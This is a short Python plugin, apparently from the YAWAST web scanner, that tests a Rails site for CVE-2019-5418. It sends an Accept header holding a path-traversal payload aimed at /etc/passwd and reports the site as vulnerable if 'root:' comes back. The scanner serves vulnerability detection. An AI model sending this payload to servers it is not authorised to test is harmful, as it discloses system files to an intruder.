from yawast.reporting.enums import Vulnerabilities
from yawast.scanner.plugins.result import Result
from yawast.shared import output, network
from typing import List, Dict, Tuple


def check_cve_2019_5418(url: str) -> List[Result]:
    # this only applies to controllers, so skip the check unless the link ends with '/'
    if not url.endswith("/"):
        return []

    results = []

    res = network.http_get(
        url, False, {"Accept": "../../../../../../../../../etc/passwd{{"}
    )
    body = res.text
    req = network.http_build_raw_request(res.request)

    if "root:" in body:
        results.append(
            Result(
                f"Rails CVE-2019-5418: File Content Disclosure: {url}",
                Vulnerabilities.SERVER_RAILS_CVE_2019_5418,
                url,
                [body, req],
            )
        )

    return results
